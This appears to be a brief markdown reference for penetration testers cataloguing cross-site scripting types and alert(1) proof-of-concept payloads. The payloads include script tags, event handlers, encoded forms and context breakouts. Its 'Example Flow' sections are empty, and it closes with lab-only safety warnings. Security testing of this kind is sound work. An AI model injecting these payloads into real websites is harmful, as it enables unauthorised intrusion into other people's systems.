# XSS Patterns and Payload Catalog

## XSS Types

### Reflected XSS
**Definition**: Malicious script is reflected off the web server in the immediate response. The payload is included in the request and returned in the response without proper sanitization.

**Example Flow**:

### Stored XSS  
**Definition**: Malicious script is stored on the server (database, files) and executed when users access the affected page.

**Example Flow**:

### DOM-based XSS
**Definition**: Vulnerability exists in client-side code where user input is written to the DOM without sanitization.

**Example Flow**:

## Payload Categories

### 1. Simple Alert-based Payloads
- `<script>alert(1)</script>`
- `"><script>alert(1)</script>`
- `';alert(1)//`

### 2. Attribute/Event Handlers
- `" onerror=alert(1)`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `" autofocus onfocus=alert(1)`

### 3. Encoded/Obfuscated Payloads
- URL encoded: `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
- HTML entities: `&lt;script&gt;alert(1)&lt;/script&gt;`
- Mixed encoding: `%3Cscript%3Ealert(1)&lt;/script&gt;`

### 4. Template/Edge-case Payloads
- JavaScript context: `'; alert(1); var x='`
- Attribute context: `" onmouseover="alert(1)`
- Style context: `</style><script>alert(1)</script>`

## Safety Notes

⚠️ **CRITICAL SAFETY WARNINGS**:
- Only test against authorized lab applications
- Never run against production systems
- Use dedicated test environments (OWASP Juice Shop, WebGoat)
- Obtain explicit permission for any testing
- Monitor for accidental data corruption